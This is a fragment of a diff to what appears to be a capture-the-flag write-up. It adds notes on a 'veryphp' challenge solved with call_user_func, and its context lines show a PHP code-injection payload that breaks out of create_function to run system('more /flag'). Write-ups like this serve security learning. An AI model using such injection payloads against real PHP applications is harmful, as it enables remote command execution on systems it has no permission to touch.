@@ -68,6 +68,12 @@ $shaw('',$root);
 root=}system('more /flag');/*
 shaw=create_function
 ```
+
+
+### veryphp
+call_user_func
+调用类的方法
+`myans=qwq::oao`
 # reverse
 
 # pwn
